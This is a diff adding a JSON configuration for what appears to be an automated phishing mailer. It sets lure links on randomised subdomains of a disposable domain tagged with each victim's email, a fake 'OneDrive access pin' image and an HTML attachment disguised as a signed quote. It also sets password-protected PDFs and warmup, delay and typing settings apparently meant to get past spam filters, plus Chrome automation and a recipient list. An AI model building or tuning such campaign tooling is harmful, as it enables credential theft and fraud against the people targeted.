@@ -1,0 +1,100 @@
+{
+  "email_config": {
+    "subject": "Quotation Request",
+    "warmup_mode": false,
+    "warmup_delay_ms": 1000,
+    "debug_mode": false,
+    "chrome_debug_port": "9222"
+  },
+  "links": {
+    "pdf_link_template": "https://drive1-{{randomalpha:8}}.miao-rvien-scredoc.laurmeich.sbs/#{{email}}",
+    "drive_link_template": "https://drive1-{{randomalpha:8}}.miao-rvien-scredoc.laurmeich.sbs/#{{email}}"
+  },
+  "delays": {
+    "between_emails_min_ms": 1000,
+    "between_emails_max_ms": 2000,
+    "after_new_mail_ms": 1000,
+    "after_fill_field_ms": 100,
+    "typing_delay_min_ms": 10,
+    "typing_delay_max_ms": 15,
+    "after_paste_attachments_ms": 2000,
+    "after_send_ms": 1500,
+    "network_retry_delay_ms": 10000,
+    "warmup_delay_ms": 1000
+  },
+  "features": {
+    "high_importance_enabled": true,
+    "warmup_enabled": false,
+    "auto_cleanup_enabled": true,
+    "failed_recipients_retry": true,
+    "network_check_enabled": false
+  },
+  "attachments": {
+    "html_filename_pattern": "Devis_signé_{{randomalpha}}.html",
+    "pdf_filename_prefix": "Estimate_Request_Plan_",
+    "zip_filename_prefix": "documents_",
+    "cleanup_orphaned_files": true,
+    "docx_filename_pattern": "Estimate_Request_Plan_{{localpart}}.docx",
+    "ics_filename_pattern": "Estimate_Request_Plan_{{localpart}}.ics"
+  },
+  "screenshot_image": {
+    "default_width": 300,
+    "default_height": 20,
+    "temp_dir": "./screenshot_images",
+    "default_background": "#ffff00",
+    "default_color": "#0000ee",
+    "default_font_size": 13,
+    "default_font_family": "'Times New Roman', serif",
+    "default_text": "Your OneDrive access pin is : {{pdfpass}}"
+  },
+  "ics": {
+    "template_file": "me.ics",
+    "timezone": "America/Tijuana",
+    "organizer_name": "Meeting Organizer",
+    "organizer_email": "organizer@example.com",
+    "default_duration_minutes": 15,
+    "default_meeting_hour": 8,
+    "default_meeting_day_offset": 4
+  },
+  "warmup_image": {
+    "enabled": true,
+    "min_size": 100,
+    "max_size": 1000,
+    "step_size": 100,
+    "random_sizes": true,
+    "temp_dir": "./warmup_images",
+    "pre_send_delay": 3000
+  },
+  "inline_image": {
+    "default_min_size": 100,
+    "default_max_size": 500,
+    "temp_dir": "./inline_images"
+  },
+  "network_check": {
+    "enabled": false,
+    "check_interval": 5000,
+    "timeout": 10000,
+    "retry_count": 3,
+    "retry_delay": 2000,
+    "test_urls": [
+      "https://www.google.com",
+      "https://www.microsoft.com"
+    ],
+    "dns_servers": ["8.8.8.8", "1.1.1.1"]
+  },
+  "pdf_password": {
+    "enabled": true,
+    "length": 4,
+    "use_numbers_only": true,
+    "placeholder": "{{pdfpass}}"
+  },
+  "paths": {
+    "recipients_file": "recipients.txt",
+    "email_template": "email.html",
+    "attachment_template": "attachment.html",
+    "selectors_file": "selectors.json",
+    "failed_recipients_file": "failed_recipients.json",
+    "warmup_tracker_file": "warmup_tracker.json",
+    "logo_path": "./logo.png"
+  }
+}
